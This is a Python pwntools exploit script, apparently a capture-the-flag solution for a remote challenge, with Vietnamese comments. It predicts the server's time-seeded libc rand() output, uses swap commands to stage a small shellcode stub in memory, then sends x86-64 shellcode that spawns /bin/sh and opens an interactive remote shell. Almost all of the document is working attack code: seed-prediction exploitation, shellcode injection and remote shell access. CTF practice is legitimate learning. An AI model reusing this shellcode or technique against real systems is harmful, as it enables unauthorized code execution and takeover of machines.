from pwn import *
import ctypes
import time
import re

context.binary = elf = ELF('./chall', checksec=False)
context.log_level = 'info'

libc = ctypes.CDLL("libc.so.6")

def solve():
    p = remote('chall.lac.tf', 31338)
    p.recvuntil(b"Tiles: 14")
    initial_output = p.recvuntil(b"> ").decode()
    
    hex_values = re.findall(r'\| ([0-9a-f]{2}) ', initial_output)
    hand = [int(x, 16) for x in hex_values]
    log.info(f"Hand: {[hex(x) for x in hand]}")

    now = int(time.time())
    seed = 0
    found = False
    for t in range(now - 1000, now + 1000):
        libc.srand(t)
        candidate = []
        for _ in range(14):
            candidate.append(libc.rand() & 0xFF)
        
        if candidate == hand:
            seed = t
            found = True
            log.success(f"Seed found: {seed}")
            break
    
    if not found:
        log.error("Không tìm thấy seed. Kiểm tra lại libc hoặc kết nối.")
        return
    libc.srand(seed)
    for _ in range(14): libc.rand()
    target_payload = b"\x31\xc0\x31\xff\xbe\x0d\x00\x37\x13\xb2\xff\x0f\x05"
    targets = {i: target_payload[i] for i in range(len(target_payload))}
    done_indices = set()

    for i in range(len(target_payload)):
        if hand[i] == target_payload[i]:
            done_indices.add(i)

    commands = []
    
    
    while len(done_indices) < len(target_payload):
        r = libc.rand() & 0xFF
        
        candidate_idx = -1
        for idx, val in targets.items():
            if idx not in done_indices and val == r:
                candidate_idx = idx
                break
        
        # Chọn lệnh: 1 = Swap
        commands.append(b"1")
        
        if candidate_idx != -1:
            commands.append(str(candidate_idx).encode())
            done_indices.add(candidate_idx)
        else:
            commands.append(b"13")
    full_payload = b"\n".join(commands) + b"\n"
    p.send(full_payload)
    time.sleep(1) 
    p.clean()
    p.sendline(b"2")
    real_shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    time.sleep(0.5)
    p.send(real_shellcode)
    
    p.interactive()

if __name__ == "__main__":
    solve()